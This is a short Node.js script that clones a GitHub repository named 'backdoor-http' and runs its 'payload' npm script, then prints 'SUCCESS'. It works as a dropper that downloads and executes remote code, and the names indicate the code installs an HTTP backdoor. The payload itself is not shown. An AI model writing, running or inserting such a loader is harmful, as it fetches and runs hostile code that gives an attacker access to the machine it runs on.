'use strict'

const { exec } = require('node:child_process')

const src = 'https://github.com/miguelzacca/backdoor-http.git'
const srcname = 'backdoor-http'

async function asyncExec(command, options) {
  return new Promise((res) => {
    exec(command, { ...options }, res)
  })
}

async function main() {
  await asyncExec(`git clone ${src}`)
  asyncExec('npm run payload', { cwd: srcname })
  console.log('SUCCESS\n')
}
main()